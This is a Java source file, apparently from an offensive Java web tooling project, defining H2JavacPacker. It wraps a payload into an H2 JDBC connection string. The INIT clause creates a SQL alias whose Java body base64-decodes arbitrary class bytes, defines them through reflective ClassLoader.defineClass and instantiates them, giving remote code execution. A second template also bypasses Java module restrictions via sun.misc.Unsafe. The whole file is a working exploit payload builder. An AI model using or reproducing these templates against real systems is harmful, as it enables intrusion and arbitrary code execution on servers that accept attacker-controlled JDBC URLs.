package com.reajason.javaweb.packer.h2;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import lombok.SneakyThrows;

/**
 * @author ReaJason
 * @since 2025/6/28
 */
public class H2JavacPacker implements Packer {
    String template = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
            "String a(String a) throws java.lang.Throwable{" +
            "byte[] bytes=null\\;" +
            "String base64Str=\"{{base64Str}}\"\\;" +
            "try {\n" +
            "    bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
            "} catch (java.lang.Throwable var6) {\n" +
            "    bytes = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;\n" +
            "}" +
            "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
            "defMethod.setAccessible(true)\\;" +
            "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(new java.net.URLClassLoader(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()),bytes,0,bytes.length)\\;" +
            "myclass.newInstance()\\;" +
            "return null\\;" +
            "}'\\;" +
            "CALL look('')";
    String bypassTemplate = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
            "String a(String a) throws java.lang.Throwable{" +
            "String base64Str=\"{{base64Str}}\"\\;" +
            "byte[] bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
            "try {" +
            "    java.lang.Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\")\\;" +
            "    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\")\\;" +
            "    unsafeField.setAccessible(true)\\;" +
            "    java.lang.Object unsafe = unsafeField.get(null)\\;" +
            "    java.lang.Object module = Class.class.getMethod(\"getModule\").invoke(java.lang.Object.class, (java.lang.Object[]) null)\\;" +
            "    java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod(\"objectFieldOffset\", java.lang.reflect.Field.class)\\;" +
            "    long offset = (Long) objectFieldOffsetM.invoke(unsafe, java.lang.Class.class.getDeclaredField(\"module\"))\\;" +
            "    java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod(\"getAndSetObject\", java.lang.Object.class, long.class, java.lang.Object.class)\\;" +
            "    java.lang.StackTraceElement[] stackTraceElements = java.lang.Thread.currentThread().getStackTrace()\\;" +
            "    java.lang.Class<?> callerClass = java.lang.Class.forName(stackTraceElements[1].getClassName())\\;" +
            "    getAndSetObjectM.invoke(unsafe, callerClass, offset, module)\\;" +
            "} catch (Throwable e) {}" +
            "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
            "defMethod.setAccessible(true)\\;" +
            "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(new java.net.URLClassLoader(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()),bytes,0,bytes.length)\\;" +
            "myclass.newInstance()\\;" +
            "return null\\;" +
            "}'\\;" +
            "CALL look('')";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        if (config.isByPassJavaModule()) {
            return bypassTemplate.replace("{{base64Str}}", config.getClassBytesBase64Str());
        }
        return template.replace("{{base64Str}}", config.getClassBytesBase64Str());
    }
}
